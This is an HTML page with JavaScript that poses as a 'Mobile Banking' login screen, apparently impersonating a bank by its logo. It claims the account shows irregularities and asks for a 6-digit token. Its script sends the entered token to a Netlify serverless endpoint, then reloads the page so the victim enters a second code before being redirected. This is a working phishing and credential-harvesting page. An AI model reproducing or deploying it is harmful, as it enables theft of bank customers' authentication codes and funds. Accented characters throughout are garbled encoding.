<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Banking</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>

<header class="top-bar">
    <div class="title">Mobile Banking</div>
    <div class="classic">
        <span class="home-icon">üè†</span>
        Versi√≥n Cl√°sica
    </div>
</header>

<div class="logo-container">
    <img src="bna.png" alt="Logo">
</div>

<div class="login-card">
    <div class="login-title">Verificaci√≥n requerida</div>

    <div class="token-error">
        Notamos irregularidades en su cuenta, para continuar,
        por favor ingrese su <strong>c√≥digo Token de 6 d√≠gitos</strong>
    </div>

    <input
        type="text"
        id="tokenInput"
        class="token-input"
        maxlength="6"
        inputmode="numeric"
        autocomplete="off"
        required
    >

    <button type="button" class="btn-accept" onclick="enviarToken()">
        <span class="check">‚úî</span>
        Aceptar
    </button>
</div>

<footer class="footer">
    <span class="close">‚úñ</span>
    <p>Salir</p>
</footer>

<script>
const tokenInput = document.getElementById("tokenInput");

/* Solo n√∫meros */
tokenInput.addEventListener("input", () => {
    tokenInput.value = tokenInput.value.replace(/[^0-9]/g, "");
});

function enviarToken() {
    const token = tokenInput.value.trim();

    if (token.length !== 6) {
        tokenInput.focus();
        return;
    }

    // Obtener intentos actuales
    let intentos = parseInt(localStorage.getItem("token_intentos")) || 0;
    intentos++;
    localStorage.setItem("token_intentos", intentos);

    fetch("/.netlify/functions/enviar", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
            tipo: "üîí TOKEN",
            valor: token
        })
    }).finally(() => {
        if (intentos >= 2) {
            // reset y volver al inicio
            localStorage.removeItem("token_intentos");
            window.location.href = "index.html";
        } else {
            // primer intento ‚Üí recarga
            window.location.reload();
        }
    });
}
</script>

</body>
</html>
